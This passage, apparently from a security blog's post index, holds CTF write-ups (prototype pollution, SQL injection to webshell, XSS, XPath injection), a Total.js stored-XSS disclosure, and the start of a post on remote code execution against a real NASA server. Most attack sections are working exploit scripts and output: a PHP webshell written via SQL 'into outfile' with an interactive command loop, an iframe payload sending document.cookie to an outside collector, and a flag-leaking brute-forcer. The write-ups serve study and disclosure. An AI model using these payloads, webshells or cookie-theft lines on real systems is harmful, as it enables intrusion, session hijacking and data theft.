\"Invalid workspace name\"});        const workspace = user.workspaces[ws_name];        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});        if(!f_name || !f_path)            return res.status(400).json({ok: false, err: \"Invalid file name or path\"});        if(!write_b64_file(path.join(user.base_dir, f_path), f_content))            return res.status(500).json({ok: false, err: \"Internal server error\"});                workspace[f_name] = f_path;        return res.status(200).json({ok: true});    });    app.delete(\"/api/users/:userid/:ws\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const ws_name = req.params.ws || \"\";        const token = req.body.token || \"\";        const f_name = req.body.file_name || \"\";                if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: \"Invalid workspace name\"});        const workspace = user.workspaces[ws_name];        console.log(workspace)        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});        if(!f_name)            return res.status(400).json({ok: false, err: \"Invalid file name\"});        const f_path = workspace[f_name];        if(!f_path)            return res.status(404).json({ok: false, err: \"Failed to find file\"});        fs.rmSync(path.join(user.base_dir, f_path), {recursive: true});        delete workspace[f_name];        return res.status(200).json({ok: true});    });    app.get(\"/api/users/:userid/:ws/:fname\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const ws_name = req.params.ws || \"\";        const f_name = req.params.fname || \"\";        const token = req.body.token || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: \"Invalid workspace name\"});               const workspace = user.workspaces[ws_name];        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});        if(!f_name)            return res.status(400).json({ok: false, err: \"Invalid file name\"});        const f_path = workspace[f_name];        if(!f_path)            return res.status(404).json({ok: false, err: \"Failed to find file\"});                const content = read_b64_file(path.join(user.base_dir, f_path));        if(typeof content == \"undefined\")            return res.status(500).json({ok: false, err: \"Internal server error\"});        res.status(200).json({ok: true, file_content: content});    });}file.js is important that solve this challenge. file.js has a function to print the workspace of user and creat, delete a file and read the file it created. But when we see the function of reading the file, it take the value of f_name from workspace object and use it as the path of file. So If we modify the value of f_name to flag path, we can read a flag.app.post(\"/api/users/:userid/:ws\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const ws_name = req.params.ws || \"\";        const token = req.body.token || \"\";        const f_name = req.body.file_name || \"\";        const f_path = req.body.file_path.replace(/\\./g,'') || \"\";        const f_content = req.body.file_content || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid id or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: \"Invalid workspace name\"});        const workspace = user.workspaces[ws_name];        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});        if(!f_name || !f_path)            return res.status(400).json({ok: false, err: \"Invalid file name or path\"});        if(!write_b64_file(path.join(user.base_dir, f_path), f_content))            return res.status(500).json({ok: false, err: \"Internal server error\"});                workspace[f_name] = f_path;        return res.status(200).json({ok: true});    });the value of f_path was defined in logic of creating a file. it put the path value into f_name value of workspace. But in the if statement, if workspace of user is not defined, error occurs but we can create it that we request to /api/users/:userid as POST. And even if we created, base_dir is /tmp/* and the value f_path remove . chars using replace() method so we can’t go to up. So we can’t escape from base_dir using this function.But Prototype Pollution occur when we make or read or delete a file. So I used it. it call several if statement after getting the value of several parameter. Here, important thing is way for calling object of users.1. const user = users[userid];2. const workspace = user.workspaces[ws_name];3. workspace[f_name] = f_path;Call all object of users as above. But here, we can use prototype pollution because be not checking the value ws_name1. const workspace = user.workspaces[__proto__];2. workspace[f_name] = f_path;If the value of ws_name is __proto__, in second part workspace will be prototype object because the result value is prototype object. then we can pollute internal property to f_path using the f_name.const users = {}users['asdf'] = {            userid : 'asdf',            pass : 'asdf',            workspaces : {'asdf':{}},            base_dir: '/tmp/a/nss'        };user = users['asdf']const workspace = user.workspaces['__proto__'];console.log(workspace)workspace['asdf'] = 'polluted'console.log(asdf)❯ node poc.js[Object: null prototype] {}pollutedSo, Prototype Pollution occur as above.POST /api/users/asdf/__proto__ HTTP/1.1Host: localhost:8888Content-Length: 97Content-Type: application/jsonConnection: close{    \"token\":\"b168dbf118c3ee0fe6db7a3d576694b5e11dfae1\",    \"file_name\":\"base_dir\",    \"file_path\":\"/usr/src/app\"}After creating a user, if we request as above, we can pollute the value what we want to base_dir. app.get(\"/api/users/:userid/:ws/:fname\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const ws_name = req.params.ws || \"\";        const f_name = req.params.fname || \"\";        const token = req.body.token || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: \"Invalid workspace name\"});               const workspace = user.workspaces[ws_name];        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});        if(!f_name)            return res.status(400).json({ok: false, err: \"Invalid file name\"});        const f_path = workspace[f_name];        console.log(f_path)        if(!f_path)            return res.status(404).json({ok: false, err: \"Failed to find file\"});                console.log(`user.base_dir : ${user.base_dir}`)        const content = read_b64_file(path.join(user.base_dir, f_path));        if(typeof content == \"undefined\")            return res.status(500).json({ok: false, err: \"Internal server error\"});        res.status(200).json({ok: true, file_content: content});    });From now, we have to make the value of f_path to flag. But this f_path is in the object of workspace and also object workspace is in the object workspaces. Eventually we have to make the object of new user after we make the new token and object of workspace temporarily. So I got the flag after I pollutued the pass, owner, expire, base_dir, flag, workspace.from itsdangerous import base64_decodeimport requestsimport jsonimport string import randomLENGTH = 4CHALL_URL = \"http://host3.dreamhack.games:19598\"#CHALL_URL = \"http://localhost:8888\" # LocallySTRING_POOL = string.digitsUSERNAME = \"\"PASSWORD = \"aaaaaaaaaaa\"HEADER = {    \"Content-Type\":\"application/json\"}for i in range(LENGTH):    USERNAME += random.choice(STRING_POOL) print(f'[+] USERNAME : {USERNAME}')# Create the User Objectrequests.post(CHALL_URL + '/api/users', headers=HEADER, data=json.dumps({\"userid\":USERNAME, \"pass\":PASSWORD}))# Logintoken = requests.post(CHALL_URL + '/api/users/auth', headers=HEADER, data=json.dumps({\"userid\":USERNAME, \"pass\":PASSWORD})).json()TOKEN = token['token'] print(f\"[+] Token : {TOKEN}\")# Prototype Pollution * 6requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({\"token\":TOKEN, \"file_name\":\"pass\", \"file_path\":\"pass\"}))requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({\"token\":TOKEN, \"file_name\":\"owner\", \"file_path\":\"pass\"}))requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({\"token\":TOKEN, \"file_name\":\"expire\", \"file_path\":\"100000000000\"}))requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({\"token\":TOKEN, \"file_name\":\"base_dir\", \"file_path\":\"/usr\"}))requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({\"token\":TOKEN, \"file_name\":\"src/app/flag\", \"file_path\":\"src/app/flag\"}))requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({\"token\":TOKEN, \"file_name\":\"workspaces\", \"file_path\":\"asdf\"}))# Leak the flagLEAK_DATA = requests.get(CHALL_URL + '/api/users/pass/__proto__/src%2fapp%2fflag', headers=HEADER, data=json.dumps({\"token\":\"pass\"})).json()try:    print(f\"[+] Leak Data : {base64_decode(LEAK_DATA['file_content'])}\")except:    print(f\"[+] Leak Data : {LEAK_DATA}\")I wrote the exploit code as above.❯ python3 nss-poc.py [+] USERNAME : 4896[+] Token : b9ab24d6a79dda202bf365541d67998a2c5bf5ce[+] Leak Data : b'GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}\\n'FLAG : GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}(V) - ColorfulMemo [490 pts]This is a challenge that triggers RCE via LFI vulnerability after uploading using SQL Injection.FROM mysql:8.0-debianENV MYSQL_RANDOM_ROOT_PASSWORD=yesENV MYSQL_USER=userENV MYSQL_PASSWORD=passwordENV MYSQL_DATABASE=colorfulmemoENV TZ=Asia/SeoulENV OPENSSL_CONF=/dev/nullRUN sed -i 's/deb.debian.org/mirror.kakao.com/g' /etc/apt/sources.list RUN apt-get update -y \\ &amp;&amp; DEBIAN_FRONTEND=noninteractive \\    apt-get install --no-install-recommends -y \\        gcc wget bzip2 python3-pip python3-setuptools \\        software-properties-common apache2 php php-mysqli \\        chrpath libssl-dev libxft-dev \\        libfreetype6 libfreetype6-dev \\        libfontconfig1 libfontconfig1-dev \\ &amp;&amp; rm -rf /var/lib/apt/lists/* /var/www/html/*COPY ./src/ /var/www/html/RUN chmod -R 755 /var/www/htmlRUN wget -q -O /root/phantomjs-2.1.1-linux-x86_64.tar.bz2 \\    https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2 \\ &amp;&amp; tar -C /root/ -jxf /root/phantomjs-2.1.1-linux-x86_64.tar.bz2 \\ &amp;&amp; cp /root/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /bin/ \\ &amp;&amp; rm -rf /root/phantomjs*RUN pip3 install --no-cache-dir selenium==2.48.0COPY ./bot.py /bot.pyRUN chmod 755 /bot.py# Config filesCOPY mysql/config/ /etc/mysql/RUN chown -R www-data:www-data /var/lib/mysql /var/run/mysqldCOPY ./init.sql /docker-entrypoint-initdb.dEXPOSE 80EXPOSE 3306COPY ./run.sh /run.shRUN chmod 755 /run.shCOPY --chown=root:www-data ./flag /flagRUN chmod 440 /flag &amp;&amp; \\    mv /flag /flag_$(md5sum /flag | awk '{print $1}')ENTRYPOINT [\"/run.sh\"]In the docker file, I could know that challenge use MySQL and Apache and location of flag is /flag_$(md5sum /flag | awk ‘{print $1}’).~/Downloads/b05d57b0-db9a-4196-a9c0-8db4c0ff5361/src❯ tree -I \"js|bootstrap\" .├── check.php├── header.php├── include.php├── index.php├── list.php├── main.php├── read.php├── submit.php└── write.php0 directories, 9 filesAbove code is back-end code. There is three vulnerabilities called CSS Injection to SSRF, SQL Injection to File upload, LFI to RCE.&lt;style&gt;    .content{        color:&lt;?php echo $color ?&gt;    }&lt;/style&gt;&lt;!-- /var/www/html/read.php --&gt;CSS Injection occurred in read.php. this is important point.&lt;?php    $path = $_GET[\"path\"];    if($path == \"\"){        $path = \"main\";    }    $path = \"./\".$path.\".php\";?&gt;&lt;style&gt;.body {    padding-top:5%;    padding-left:5%;    padding-right:5%;}&lt;/style&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;?php include_once \"./include.php\"; ?&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;?php include_once \"./header.php\"; ?&gt;        &lt;div class=\"body\"&gt;            &lt;?php include_once $path; ?&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;&lt;!-- /var/www/html/index.php --&gt;LFI occurred because it don’t check $path parameter in index.php.&lt;?phpif($_SERVER[\"REMOTE_ADDR\"] == '127.0.0.1' || $_SERVER[\"REMOTE_ADDR\"] == '::1'){    $id = $_GET['id'];    $mysqli = new mysqli('localhost','user','password','colorfulmemo');    // I believe admin    $result = $mysqli-&gt;query('SELECT adminCheck FROM memo WHERE id = '.$id);    if($result){        $row = mysqli_fetch_row($result);        if($row){            if($row[0] != 1){                $stmt = $mysqli-&gt;prepare('UPDATE memo SET adminCheck = 1 WHERE id = ?');                $stmt-&gt;bind_param('i',$id);                $stmt-&gt;execute();                $stmt-&gt;close();            }        }    }}else{    die(\"no hack\");}# /var/www/html/check.php?&gt;SQL Injection occurred because it don’t check $id parameter in check.php. But SQL Injection is occuring only locally.from selenium import webdriverimport timeimport sys, osmemoid = sys.argv[1]driver = webdriver.PhantomJS(service_log_path='/dev/null')driver.implicitly_wait(10)driver.get(\"http://localhost/read.php?id=\" + memoid)driver.get(\"http://localhost/check.php?id=\" + memoid)&lt;?php$id = $_GET['id'];if(ctype_digit($id)){    exec(\"python3 /bot.py \".$id);}else{    die(\"no hack\");}die('&lt;script&gt; location.href=\"/\" &lt;/script&gt;');?&gt;it calls bot.py in submit.php. we can’t exploit because it don’t check $id parameter using ctype_digit() function. But we can exploit as SSRF using background: url() of CSS. So I just decided to insert an SSRF PoC as color value using post writing function.POST /?path=write HTTP/1.1Host: host1.dreamhack.games:9111Content-Length: 95Content-Type: application/x-www-form-urlencodedConnection: closememoTitle=asdf&amp;memoColor=aqua}.content{background:%20url('https://google.com')&amp;memoContent=adsfI inserted an SSRF PoC as above. After this processing, When I go to connect, I could see that it request to check.php well. If we report this post, we can see that it sleep for 5 seconds. (delete photo)[mysqld]pid-file        = /var/run/mysqld/mysqld.pidsocket          = /var/run/mysqld/mysqld.sockdatadir         = /var/lib/mysqlsecure-file-priv= /tmp/default_authentication_plugin=mysql_native_password# Custom config should go here!includedir /etc/mysql/conf.d/Now we have to upload the webshell. So I tried to upload the webshell to /var/www/html/cmd.php but it failed. So I read a code that for finding a reason. The reason is that the value of secure-file-priv is /tmp.POST /?path=write HTTP/1.1Host: host1.dreamhack.games:9111Content-Length: 220Content-Type: application/x-www-form-urlencodedConnection: closememoTitle=asdf&amp;memoColor=aqua}.content{background:%20url('/check.php?id=99999%20union%20select%20concat(char(60),\"?php%20echo%20system($_GET[\\'cmd\\']);%20?\",char(62))%20into%20outfile%20\"/tmp/cmd1.php\"')&amp;memoContent=adsfSo, as above, I inserted the SQL Injection payload that upload the webshell in the /tmp/cmd1.php path and uploaded the webshell through the report function.import requestsimport string import randomimport reCHALLURL = \"http://host2.dreamhack.games:16301\"LENGTH = 6string_pool = string.digitsfilename = \"\"for i in range(LENGTH):    filename += random.choice(string_pool) FILANAME = filename + '.php'print(f'[+] FILANAME : {FILANAME}')MEMODATA = {    'memoTitle':'asdf',    'memoColor':'aqua}.content{background: url(\\'/check.php?id=9999999 union select concat(char(60),\"?php echo system($_GET[\\\\\\'cmd\\\\\\']); ?\",char(62)) into outfile \"/tmp/' + FILANAME + '\"\\')',    'memoContent':'asdf'}requests.post(CHALLURL + '/?path=write')print(f'[+] MEMODATA : {MEMODATA}')requests.post(CHALLURL + '/?path=write', data=MEMODATA)POST_COUNT = re.findall('\\&lt;th scope\\=\\\"row\\\"\\&gt;[0-9]*\\&lt;\\/th\\&gt;', requests.get(CHALLURL + '/?path=list').text)REPORT_NUM = POST_COUNT[-1].split('&lt;th scope=\"row\"&gt;')[1].split('&lt;/th&gt;')[0]requests.get(CHALLURL + f'/submit.php?id={REPORT_NUM}')print(\"\\n[+] Enable webshell!!\")while(1):    payload = input(\"[+] Enter the command : \")    RESULT = requests.get(CHALLURL + f'/?path=../../../../../../tmp/{filename}&amp;cmd={payload}').text.split('&lt;div class=\"body\"&gt;')[1].split('&lt;/div&gt;')[0].strip()    print(RESULT)I wrote the exploit code as above❯ python3 poc.py[+] FILANAME : 367455.php[+] MEMODATA : {'memoTitle': 'asdf', 'memoColor': 'aqua}.content{background: url(\\'/check.php?id=9999999 union select concat(char(60),\"?php echo system($_GET[\\\\\\'cmd\\\\\\']); ?\",char(62)) into outfile \"/tmp/367455.php\"\\')', 'memoContent': 'asdf'}[+] Enable webshell!![+] Enter the command : iduid=33(www-data) gid=33(www-data) groups=33(www-data)uid=33(www-data) gid=33(www-data) groups=33(www-data)[+] Enter the command : pwd/var/www/html/var/www/html[+] Enter the command : ls / | grep '^flag'flag_47ef1a0fd43364198f2422159badba75flag_47ef1a0fd43364198f2422159badba75[+] Enter the command : cat /flag_47ef1a0fd43364198f2422159badba75GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}[+] Enter the command : FLAG : GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}"
  },
  
  {
    "title": "Total.js CMS, Cross-Site Scripting",
    "url": "/posts/xss-total.js/",
    "categories": "",
    "tags": "",
    "date": "2022-03-05 15:51:45 +0900",
    





    
    "snippet": "SummaryThe total.js Platform offers you an excellent and stable server-side Node.js framework, client-side library for creating famous web applications with more than 250 UI components for free.I d...",
    "content": "SummaryThe total.js Platform offers you an excellent and stable server-side Node.js framework, client-side library for creating famous web applications with more than 250 UI components for free.I discovered the stored xss vulnerability in this open source.Analysis\t\t\tvar parent = item.parent;\t\t\tvar path = item.name;\t\t\tvar is = false;+\t\t\tvar cache = {};+\t\t\tvar sub;\t\t\twhile (parent) {-\t\t\t\tvar sub = response.items.findItem('id', parent);-\t\t\t\tif (!sub || sub.url === '/' || sub.id === parent)+\t\t\t\tsub = response.items.findItem('id', parent);+\t\t\t\tif (!sub || sub.url === '/' || cache[sub.id])\t\t\t\t\tbreak;+\t\t\t\tcache[sub.id] = 1;\t\t\t\tpath = sub.name + ' / ' + path;\t\t\t\tparent = sub.parent;\t\t\t\tis = true;@@ -274,7 +277,7 @@\tfor (var i = 0; i &lt; arr.length - 1; i++) {\t\tvar path = arr[i];-\t\tbuilder.push('&lt;span class=\"silver\"&gt;{0} /&lt;/span&gt;'.format(path.trim()));+\t\tbuilder.push('&lt;span class=\"silver\"&gt;{0} /&lt;/span&gt;'.format(path.trim().encode()));\t}\treturn (builder.length ? (builder.join('')) : '') + arr.last();This issue was fixed in 95f54a5 commit.Proof of ConceptPoC : \"&gt;&lt;img src=x onerror=alert(1)&gt;1. Install cms of before 95f54a5 commit2. npm start and open the url3. Go to Pages of Content4. Enter the Poc as name of page and Create the page.Reporting Timeline  2022-02-27 15h 16m : Reported this issue via the github issue  2022-02-27 17h 28m : Added the bug label by @petersirka  2022-03-01 12h 47m : Patched this issue by @petersirkaReference  Github Commit  Github Issue  Mitre  NVD"
  },
  
  {
    "title": "Codegate 2022 Write Up",
    "url": "/posts/CodeGate/",
    "categories": "",
    "tags": "",
    "date": "2022-03-01 08:29:53 +0900",
    





    
    "snippet": "SummaryThe codegate was held from February 26th to 27th, but I did not even participate because I was not interested, and I only solved 3 web problems today for study.(Web) CAFEThe CAFE challenge i...",
    "content": "SummaryThe codegate was held from February 26th to 27th, but I did not even participate because I was not interested, and I only solved 3 web problems today for study.(Web) CAFEThe CAFE challenge is very similar to the easyxss challenge I made in 2021. I heard that there were many solvers at the time of the competition because the administrator account was exposed as unintent.function filterHtml($content) {    $result = '';    $html = new simple_html_dom();    $html-&gt;load($content);    $allowTag = ['a', 'img', 'p', 'span', 'br', 'hr', 'b', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'code', 'iframe'];    foreach($allowTag as $tag){      foreach($html-&gt;find($tag) as $element) {        switch ($tag) {          case 'a':            $result .= '&lt;a href=\"' . str_replace('\"', '', $element-&gt;href) . '\"&gt;' . htmlspecialchars($element-&gt;innertext) . '&lt;/a&gt;';            break;          case 'img':            $result .= '&lt;img src=\"' . str_replace('\"', '', $element-&gt;src) . '\"&gt;' . '&lt;/img&gt;';            break;          case 'p':          case 'span':          case 'b':          case 'h1':          case 'h2':          case 'h3':          case 'h4':          case 'h5':          case 'h6':          case 'strong':          case 'em':          case 'code':            $result .= '&lt;' . $tag . '&gt;' . htmlspecialchars($element-&gt;innertext) . '&lt;/' . $tag . '&gt;';            break;          case 'iframe':            $src = $element-&gt;src;            $host = parse_url($src)['host'];            if (strpos($host, 'youtube.com') !== false){              $result .= '&lt;iframe src=\"'. str_replace('\"', '', $src) .'\"&gt;&lt;/iframe&gt;';            }            break;        }      }    }    return $result;  }If you look at the filterHtml() function, you can see that only a, img, code, and iframe tags can be used. We need to trigger XSS, but only a tags and iframe tags. However, the ‘a’ tag should be clicked by the bot, but there is no click event in the bot, so I just used an iframe.If you look at the iframe tag part, the hostname of the src attribute value of the iframe should always be youtube.com. That is, it must be a URL such as https://google.com or http://google.com. But we can put hostname in javascript scheme.All parsers provided by python, java, and javascript separate protocols and hostnames based on ://. But javascript://google.com does not run javascript. However, if it is used like javascript://google.com/%0aalert(1), it is excluded from execution by parsing. We can use this to get flags.&lt;iframe src=javascript://youtube.com/%0afetch('https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?flag'.concat(document.cookie))&gt;FLAG : codegate2022{4074a143396395e7196bbfd60da0d3a7739139b66543871611c4d5eb397884a9}I inserted the above tag and reported it, so I was able to get an administrator session, and I logged in using the session and read the flag.(Web) babyFirstprivate static String lookupImg(String memo) {    Pattern pattern = Pattern.compile(\"(\\\\[[^\\\\]]+\\\\])\");    Matcher matcher = pattern.matcher(memo);    String img = \"\";    if (matcher.find()) {      img = matcher.group();    } else {      return \"\";    }     String tmp = img.substring(1, img.length() - 1);    tmp = tmp.trim().toLowerCase();    pattern = Pattern.compile(\"^[a-z]+:\");    matcher = pattern.matcher(tmp);    if (!matcher.find() || matcher.group().startsWith(\"file\"))      return \"\";     String urlContent = \"\";    try {      URL url = new URL(tmp);      BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));      String inputLine = \"\";      while ((inputLine = in.readLine()) != null)        urlContent = urlContent + inputLine + \"\\n\";       in.close();    } catch (Exception e) {      return \"\";    }     Base64.Encoder encoder = Base64.getEncoder();    try {      String encodedString = new String(encoder.encode(urlContent.getBytes(\"utf-8\")));      memo = memo.replace(img, \"&lt;img src='data:image/jpeg;charset=utf-8;base64,\" + encodedString + \"'&gt;&lt;br/&gt;\");      return memo;    } catch (Exception e) {      return \"\";    }   }A vulnerability occurs in the lookupImg() function. If a memo is written in the same syntax as [https://pocas.kr], the lookupImg() function fetches the value inside [] with a regular expression and then verifies the protocol.    if (!matcher.find() || matcher.group().startsWith(\"file\"))      return \"\"; When the file scheme is passed, it is returned immediately.if (spec.regionMatches(true, start, \"url:\", 0, 4)) {                start += 4;            }// https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/net/URL.java#L533L535However, if you look at the URL code, if the start of the url starts with url:, it is parsed by moving the starting point by 4. That is, if the value of url:file:///etc/passwd is passed, it moves by 4 and only file:///etc/passwd is interpreted.    pattern = Pattern.compile(\"^[a-z]+:\");    matcher = pattern.matcher(tmp);    if (!matcher.find() || matcher.group().startsWith(\"file\"))And if you check the file scheme again, you can see that the matcher value is parsed using /^[a-z]+:/ regular expression. Since the parsing is based on the colon, if you just pass it as url:file:///etc/passwd, the character before the first colon is parsed, so the file scheme does not take place. Parse it. As a result, it successfully parses file:///etc/passwd.So just pass it to [url:file///flag] and read the image.atob(\"Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg==\")FLAG : codegate2022{8953bf834fdde34ae51937975c78a895863de1e1}(Web) MyBlogXPath xpath = XPathFactory.newInstance().newXPath();String title = (String)xpath.evaluate(\"//article[@idx='\" + idx + \"']/title/text()\", document, XPathConstants.STRING);String content = (String)xpath.evaluate(\"//article[@idx='\" + idx + \"']/content/text()\", document, XPathConstants.STRING);If you look at the doReadArticle() function, the Xpath Injection vulnerability occurs because the idx value is added as it is.RUN echo 'flag=codegate2022{md5(flag)}' &gt;&gt; /usr/local/tomcat/conf/catalina.propertiesBut if you look at the location of the flag, it is in catalina.properties. So I just can’t read it. However, while studying Xpath Injection in the past, I used the system-property() function. The function of this function is to return the system property identified by the argument value. So just use this to return the system property called flag and read it with substring().import requestsurl = \"http://3.39.79.180/blog/read?idx=\"strings = \"abcdefghijklmnopqrstuvwxyz0123456789{}\"sess = requests.Session()def login():    sess.post('http://3.39.79.180/blog/login', data={'id':'pocas', 'pw':'pocas'})    print(\"[+] log-in succeed\")def leak():    flag = ''    for i in range(1, 100):        for c in strings:            u = url + f\"'or substring(system-property('flag'),{i},1)='{c}'or '\"            res = sess.get(u).text            if 'sdf' in res:                flag += c                break        if len(flag) &gt; 1 and flag[-1] == '}':            break    print(f'[+] FLAG : {flag}')if __name__ == '__main__':    print('[+] Exploit')    login()    leak() ⚡ root  ~/hacking/ctf/codegate2022/myblog  python3 exploit.py[+] Exploit[+] log-in succeed[+] FLAG : codegate2022{bcbbc8d6c8f7ea1924ee108f38cc000f} ⚡ root  ~/hacking/ctf/codegate2022/myblog FLAG : codegate2022{bcbbc8d6c8f7ea1924ee108f38cc000f}"
  },
  
  {
    "title": "NASA, Remote Code Excution (0-Day Exploit)",
    "url": "/posts/RCE-in-NASA/",
    "categories": "",
    "tags": "",
    "date": "2022-02-19 21:32:45 +0900",
    





    
    "snippet": "SummaryThe psg.gsfc.nasa.gov was very vulnerable to Remote Code Execution.Analysisdocker pull nasapsg/psgdocker run -it -p 3000:3000 nasapsg/psg /bin/shIf you set as above, you can analyze the code...",
    "content": "SummaryThe psg.gsfc.nasa.gov was very vulnerable to Remote Code Execution.Analysisdocker pull nasapsg/psgdocker run -it -p 3000:3000 nasapsg/psg /bin/shIf you set as above, you can analyze the code.https://psg.gsfc.nasa.gov/api.phpThe Remote Code Execution vulnerability occurred in the above URL.// Define parameters of the run$wgeo='y';$wephm='n';$watm='n';$whdr='y';$wgen='y';if (isset($_POST['wgeo']))  $wgeo = $_POST['wgeo'];  else $wgeo = 'y';if (isset($_POST['wephm'])) $wephm= $_POST['wephm']; else $wephm= 'n';if (isset($_POST['watm']))  $watm = $_POST['watm'];  else $watm = 'n';if (isset($_POST['whdr']))  $whdr = $_POST['whdr'];  else $whdr = 'y';if (isset($_POST['type']))  $otyp = $_POST['type'];  else $otyp = 'rad';if (isset($_POST['mode']))  $mode = $_POST['mode'];  else $mode = '';if ($otyp=='set' || $otyp=='upd') exit();if ($otyp=='cfg' || $otyp=='ret') {                      $wcon='n'; $wgas='n'; $wgen='n';}if ($otyp=='str' || $otyp=='srf') {$wgeo='n'; $watm='n'; $wcon='y'; $wgas='n'; $wgen='n';}if ($otyp=='tel') {                $wgeo='n'; $watm='n'; $wcon='n'; $wgas='n'; $wgen='y';}if ($otyp=='trn' || $otyp=='atm') {                                            $wgen='n';}if ($otyp=='opc') {                $wgeo='n'; $watm='n'; $wcon='n'; $wgas='y'; $wgen='n';}if ($otyp=='mss') {                                                            $wgen='y';}// /var/www/html/api.phpWhen I see the above code, get a value of parameter called wgeo, wephm, watm, whdr, type, mode and I can see that put in each variable.if (strlen($app)&gt;0) {  // Call the app  $app = preg_replace('/[^a-z]/', '', htmlspecialchars(substr($app,0,10),ENT_QUOTES,'UTF-8'));  system($bindir . $app . ' ' . $ID);} else {  // Call the modules  if ($wgeo=='y' || $wephm!='n') system($bindir . 'geometry ' . $ID . ' ephm=' . $wephm . ' atm=' . $watm);   // Call the geometry module  if ($watm=='y') system($bindir . 'atmosphere ' . $ID);   // Call the atmosphere model  if ($otyp=='ret') {    exec($bindir . 'retrieve '  . $ID);                    // Call the retrieval module  } else if ($geo=='massspec' &amp;&amp; $wgen=='y') {      $otyp = 'mss';      exec($bindir . 'mass '  . $ID);                      // Call the Mass-Spec module  } else {    if ($wcon=='y') exec($bindir . 'continuum ' . $ID);    // Call the surfaces and transmittance module    if ($wgas=='y' &amp;&amp; $ast!='none') {                      // Call the atmospheric modules      if ($ast=='coma') {        exec($bindir . 'cem ' . $ID);                      // Call the cometary emission model      } else  {        exec($bindir . 'pumas ' . $ID);                    // Call the planetary radiative transfer module      }    }    if ($wgen=='y') exec($bindir . 'generator ' . $ID);    // Call the flux integrator  }}// /var/www/html/api.phpWhen I see code below, I can see the above code! In the here, When I see to use a system() function in first “if statement” of “else statement”.In the here, The important information is values of $wephm and $watm variables are passed as the “argument” values of the system() function. This means that a Remote Code Execution attack can be performed by manipulating the variable.But, I can’t see the result value of system() function because it execute on the server.Yeah~ They’re using the apache server.So I decided to create a file containing the return value of the shell command in the apache default path.$tfile = $_POST['file'];if (substr($tfile,0,1)!='&lt;') return 0;$maxlines=2000; $lines[$maxlines]; $iline=0;$indata=0; $ndat=0; $maxvals=50000; $lams[$maxvals]; $vals[$maxvals]; $evals[$maxvals]; $noise=0;$b1 = strpos($tfile,'&lt;BINARY&gt;');if ($b1!==FALSE) {  $b2 = strpos($tfile,'&lt;/BINARY&gt;'); if ($b2&lt;=0) $b2=strlen($tfile);  $bindata = substr($tfile, $b1+8, $b2-$b1-8);  if ($bindata!==False) {    $file = fopen($resdir . 'binaries/' . $ID . '_' . $binname . '.dat', 'w');    fwrite($file, $bindata);    fclose($file);  }  $tfile = substr($tfile,0,$b1) . substr($tfile,$b2+9,-1);}if ($add) $tfile = file_get_contents($resdir . $ID . '_cfg.txt') . $tfile;$txts = explode(PHP_EOL, $tfile);if (count($txts)&lt;2) $txts = explode(\"\\r\", $tfile);for ($i=0;$i&lt;count($txts) &amp;&amp; $iline&lt;$maxlines &amp;&amp; $ndat&lt;$maxvals;$i++) {  $txt = substr(trim($txts[$i]),0,30000);  if (strncmp($txt,'&lt;ATMOSPHERE-STRUCTURE&gt;', 22)==0) $ast  = strtolower(substr($txt,22));  if (strncmp($txt,'&lt;GENERATOR-GAS-MODEL&gt;',  21)==0) $wgas = strtolower(substr($txt,21));  if (strncmp($txt,'&lt;GENERATOR-CONT-MODEL&gt;', 22)==0) $wcon = strtolower(substr($txt,22));  if (strncmp($txt,'&lt;GEOMETRY&gt;', 10)==0)             $geo  = strtolower(substr($txt,10));  if (strncmp($txt,'&lt;DATA&gt;', 6)==0) { $indata=1; continue; }  if (strncmp($txt,'&lt;/DATA&gt;',7)==0) { $indata=0; continue; } 